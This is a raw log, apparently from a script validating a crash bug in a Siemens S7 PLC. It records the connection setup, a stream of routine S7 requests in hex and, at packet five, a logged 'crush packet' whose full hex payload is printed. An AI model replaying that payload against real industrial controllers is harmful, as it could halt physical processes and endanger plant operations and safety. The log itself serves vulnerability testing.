[2021-11-29 20:02:59,979] [INFO] [valition.<module>] -> Will send 100000 packets, the crush packet is 5
[2021-11-29 20:02:59,980] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-29 20:03:00,097] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-11-29 20:03:00,098] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-11-29 20:03:33,799] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-11-29 20:03:34,009] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-11-29 20:03:34,210] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-11-29 20:03:34,427] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-11-29 20:03:34,631] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-11-29 20:03:35,116] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-29 20:03:35,117] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100000700000e00000401120a10010003000083000001
[2021-11-29 20:03:35,329] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-11-29 20:03:35,531] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-11-29 20:03:35,747] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:35,955] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:36,166] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:36,383] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:36,585] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:36,788] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:36,990] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-11-29 20:03:37,207] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-11-29 20:03:37,411] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-11-29 20:03:37,617] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-11-29 20:03:37,832] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-11-29 20:03:38,037] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
